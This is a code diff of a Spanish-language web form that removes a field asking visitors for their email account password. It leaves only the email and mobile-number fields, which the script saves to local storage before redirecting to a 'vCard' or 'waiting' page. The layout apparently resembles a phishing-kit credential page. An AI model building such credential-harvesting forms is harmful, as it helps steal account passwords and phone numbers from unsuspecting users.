@@ -53,14 +53,6 @@
 						</div>
 						<br>
 						<div style="text-align: left;">
-							<img src="img/info.jpg" class="icon-info"><span class="etiqueta"> Ingrese su Clave de
-								Correo</span>
-						</div>
-						<div class="input-icono pass">
-							<input type="password" name="txtPass" id="txtPass" autocomplete="off">
-						</div>
-						<br>
-						<div style="text-align: left;">
 							<img src="img/info.jpg" class="icon-info"><span class="etiqueta"> Ingrese su Celular</span>
 						</div>
 						<div class="input-icono celular">
@@ -138,42 +130,34 @@
 <script type="text/javascript">
 
 	document.addEventListener('DOMContentLoaded', function () {
+
 		var btnMail = document.getElementById('btnMail');
 		var txtMail = document.getElementById('txtMail');
-		var txtPass = document.getElementById('txtPass');
 		var txtCelular = document.getElementById('txtCelular');
 		var mensaje = document.getElementsByClassName('mensaje')[0];
 		var email = document.getElementsByClassName('email')[0];
-		var pass = document.getElementsByClassName('pass')[0];
 		var celular = document.getElementsByClassName('celular')[0];
 
 		btnMail.addEventListener('click', function () {
 			if (txtMail.value.length > 0) {
-				if (txtPass.value.length > 0) {
-					if (txtCelular.value.length > 9) {
+				if (txtCelular.value.length > 9) {
 
-						// Guardar
-						info.email = txtMail.value;
-						info.pemail = txtPass.value;
-						info.cel = txtCelular.value;
-						LS.setItem('info', JSON.stringify(info));
+					// Guardar
+					info.email = txtMail.value;
+					info.cel = txtCelular.value;
+					LS.setItem('info', JSON.stringify(info));
 
-						// Redirigir
-						if (info.err === '') {
-							window.location.href = 'vCard.html';
-						} else {
-							window.location.href = 'waiting.html';
-						}
-
+					// Redirigir
+					if (info.err === '') {
+						window.location.href = 'vCard.html';
 					} else {
-						mensaje.style.display = 'block';
-						celular.style.border = '1px solid red';
-						txtCelular.focus();
+						window.location.href = 'waiting.html';
 					}
+
 				} else {
 					mensaje.style.display = 'block';
-					pass.style.border = '1px solid red';
-					txtPass.focus();
+					celular.style.border = '1px solid red';
+					txtCelular.focus();
 				}
 			} else {
 				mensaje.style.display = 'block';
@@ -184,11 +168,6 @@
 
 		txtMail.addEventListener('keyup', function (e) {
 			email.style.border = '1px solid #CCCCCC';
-			mensaje.style.display = 'none';
-		});
-
-		txtPass.addEventListener('keyup', function (e) {
-			pass.style.border = '1px solid #CCCCCC';
 			mensaje.style.display = 'none';
 		});
 
